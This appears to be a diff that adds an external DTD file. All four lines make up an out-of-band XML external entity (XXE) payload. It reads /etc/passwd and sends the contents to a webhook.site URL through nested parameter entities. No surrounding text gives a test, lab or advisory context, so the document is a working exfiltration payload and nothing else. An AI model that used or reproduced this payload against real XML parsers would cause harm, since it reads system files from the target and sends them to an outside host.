@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/2dad8c00-369e-4dfd-8c15-1dbde776d801?file=%file;'>">
+%eval;
+%exfil;
